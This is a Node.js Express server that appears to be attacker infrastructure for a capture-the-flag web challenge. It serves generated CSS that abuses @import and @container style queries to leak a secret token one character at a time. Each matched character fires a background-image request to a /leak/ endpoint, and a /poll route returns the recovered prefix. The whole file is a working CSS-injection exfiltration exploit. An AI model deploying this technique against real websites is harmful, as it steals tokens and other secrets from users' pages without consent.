const express = require('express');

const app = express();
const PORT = 5001;

const charset = '0123456789abcdefghijklmnopqrstuvwxyz'

flag = 'justToken{'

app.get('/css', (req, res) => {
  res.set('content-type', 'text/css');
  result = "";
  for (const v in charset){
    result += `@import "/var/y_${charset[v]}";\n`
  }
  for (const v in charset){
    result += `@container style(--x:var(--y_${charset[v]})){
  body{
    background: red url('/leak/${flag}${charset[v]}');
  }
}\n`;
  }
  res.send(result);
});

app.get('/exploit', (req, res) => {
  res.sendFile(__dirname + '/exploit.html');
});
app.get('/var/:id', (req, res)=>{
  res.set('content-type', 'text/css');
  v = req.params.id.split('_')[1]
  data = `,
${flag}${v}...</pre>
        </td>
      </tr>

  </table>

  <form method="POST" action="/tasks/create">
    <button class="btn" type="submit">Create New Task</button>
  </form>

</body>

</html>`
  const variableTpl = `*{--${req.params.id}:${data}`;
  res.send(variableTpl);
});

app.get('/tasks', (req, res) => {
  res.sendFile(__dirname + '/tasks.html');
});
app.get('/leak/:flag', (req, res) =>{
  flag = req.params.flag;
  console.log(req.params.flag)
  res.send('ok');
})
app.get('/poll', async (req, res) => {
  res.send(flag);
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));